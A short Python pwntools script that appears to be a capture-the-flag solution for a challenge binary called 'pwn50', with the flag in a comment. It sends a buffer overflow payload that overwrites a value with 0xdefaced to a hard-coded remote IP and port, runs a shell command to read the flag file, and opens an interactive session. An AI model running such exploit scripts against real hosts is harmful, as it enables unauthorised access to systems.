#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# Bugs_Bunny{lool_cool_stuf_even_its_old!!!!!}

host , port = '54.153.19.139' , 5251
#host , port = '192.168.78.133' , 4000
y = remote( host , port )

e = ELF('pwn50')

p = '\x62\x75\x67' + 'D' * 21
p += p64( 0xdefaced )

y.sendline( p )


sleep( 0.7 )

y.sendline( 'cat /home/`whoami`/flag' )


y.interactive()